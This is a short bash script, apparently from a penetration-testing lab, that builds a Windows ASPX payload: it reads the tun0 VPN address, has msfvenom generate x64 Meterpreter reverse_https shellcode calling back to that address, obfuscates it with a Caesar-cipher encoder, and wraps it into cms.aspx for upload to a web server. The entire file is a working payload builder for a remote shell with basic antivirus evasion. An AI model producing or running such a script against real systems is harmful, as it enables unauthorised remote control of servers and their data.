#! /bin/bash
if [ $# -eq 0 ]
then
  echo "No port specified, defaulting to port 443"
  port="443"
else
  port=$1
fi

#get ip address of tun0
ipaddr="$(ip --brief a | grep tun0 | awk '{print $3}' | sed 's/\/\w\+//g')"
echo "ip: $ipaddr port: $port payload: windows/x64/meterpreter/reverse_https"


msfvenom -p windows -p windows/x64/meterpreter/reverse_https LHOST=$ipaddr LPORT=$port -f raw -o shell.txt
#mono caesar.exe

cat aspx.head > cms.aspx
mono caesar5.exe >> cms.aspx
cat aspx.tail >> cms.aspx

echo "Finished, payload located at cms.aspx"
